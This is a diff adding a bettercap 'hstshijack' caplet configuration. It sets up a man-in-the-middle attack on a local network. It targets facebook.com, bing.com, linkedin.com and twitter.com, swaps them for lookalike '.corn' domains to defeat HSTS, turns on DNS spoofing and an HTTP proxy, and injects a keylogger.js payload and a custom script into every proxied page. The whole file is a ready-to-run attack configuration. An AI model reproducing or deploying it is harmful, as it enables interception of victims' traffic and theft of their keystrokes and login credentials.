@@ -1,0 +1,18 @@
+# Documentation can be found at https://github.com/bettercap/blob/master/hstshijack/README.md
+
+set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         facebook.com, *.facebook.com, *.bing.com, bing.com, www.linkedin.com, twitter.com
+set hstshijack.replacements    facebook.corn, *.facebook.corn,*.bing.corn, bing.corn, linkedin.com, twitter.corn
+#set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js, *:/root/atil.js
+
+set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  facebook.corn, *.facebook.corn,*.bing.corn, bing.corn, linkedin.com, twitter.corn
+
+http.proxy  on
+dns.spoof   on
+
+
